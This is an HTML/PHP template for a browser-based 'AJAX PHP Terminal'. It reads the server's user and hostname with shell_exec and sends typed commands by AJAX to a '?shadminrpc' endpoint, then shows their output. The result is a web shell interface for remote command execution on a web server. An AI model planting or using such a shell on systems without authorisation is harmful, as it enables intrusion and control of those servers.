<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <title>AJAX PHP Terminal</title>
    
    <script type="text/javascript" language="JavaScript">
        var current_line = 0;
        var command_hist = new Array();
        var last = 0;
        
        var the_cwd;
        var the_prompt;
        var color = 'linux';
    
        function key(e) {
            if (!e) var e = window.event;
        
            if (e.keyCode == 38 && current_line < command_hist.length) {
                if (current_line == 0) {
                    command_hist.unshift(document.shell.command.value);
                    current_line++;
                }
                document.shell.command.value = command_hist[current_line];
                current_line++;
            }
            
            if (e.keyCode == 40 && current_line > 0) {
                current_line--;
                document.shell.command.value = command_hist[current_line];
            }
        }
        
        function init() {
            document.shell.setAttribute("autocomplete", "off");
            document.shell.command.focus();
            
            <?php 
                echo "the_cwd = '".getcwd()."';";
                
                $user=shell_exec("whoami");
                $host=explode(".", shell_exec("uname -n"));
                echo "the_prompt = '"."".rtrim($user).""."@"."".rtrim($host[0])."';";
            ?>
            document.getElementById("prompt").innerHTML = the_prompt + ":" + the_cwd + "> ";
        }

        //---------------- AJAX stuff start ---------------------------
        function createRequestObject() {
            var ro;
            var browser = navigator.appName;
            if(browser == "Microsoft Internet Explorer"){
                ro = new ActiveXObject("Microsoft.XMLHTTP");
            }else{
                ro = new XMLHttpRequest();
            }
            return ro;
        }
        
        var http = createRequestObject();
        
        function sendRequest(option, command) {
            http.open('get', '?shadminrpc<?php echo htmlspecialchars_decode($GLOBALS["authstr"]); ?>&option=' + option + '&command=' + command + '&cwd=' + the_cwd);
            http.onreadystatechange = handleResponse;
            http.send(null);
        }
        
        function handleResponse() {
            if(http.readyState == 4){
                var response = http.responseText;
                var update = new Array();
        
                if(response.indexOf('|' != -1)) {
                    update = response.split('|');
                    switch (update[0]) {
                        case 'command':
                            if (update[2]) { //cwd (only if changed)
                                the_cwd = update[2];
                            }
                            document.getElementById("top").innerHTML += "<pre>" + update[1] + "</pre>";
                            document.getElementById("prompt").innerHTML = the_prompt + ":" + the_cwd + "> ";
                            document.shell.command.value = "";
                            document.shell.command.focus();
                            document.shell.command.select();
                            break;
                        case 'prompt':
                            the_prompt = update[1];
                            break;         
                    }
                }
            }
        }
        
        function formSubmit () {
            document.getElementById("top").innerHTML += the_prompt + ":" + the_cwd + "> ";
            document.getElementById("top").innerHTML += document.shell.command.value;
            command_hist.unshift(document.shell.command.value);
            sendRequest('command', document.shell.command.value); 
            
            return false;
        }
        //---------------- AJAX stuff end ---------------------------
        
    </script>

    <style>
        #container{ 
           width:100%; 
           margin:0px;
           font-family:"Courier New", Courier, mono;
           font-size:14px; 
           text-align:left;
        } 
        #top{ 
           background-color: #000; 
           color: #ccc; 
           width: 100%; 
        } 
        #bottom{ 
           background-color: #000; 
           color: #ccc; 
           width: 100%; 
        } 
        #prompt{ 
           background-color: #000; 
           color: #ccc; 
           float:left;
        } 
        #promptinput {
            height: 14px;
            font-family:"Courier New", Courier, mono;
            font-size:14px; 
            margin-left: 4px;
            line-height:14px; 
            background-color:#000; 
            color:#ccc;
            border:0; 
        }
    </style>
</head>

<body onload="init()">

<form name="shell" onsubmit="return formSubmit();">
<div id="container"> 
    <div id="top">
        <!-- This is where all the content goes -->
    </div>
    <div id="bottom">
        <div id="prompt"></div>
        <input id="promptinput" name="command" type="text" size='50' onkeyup="key(event)" tabindex="1">
    </div>
</div> 
</form>
</body> 

</html>
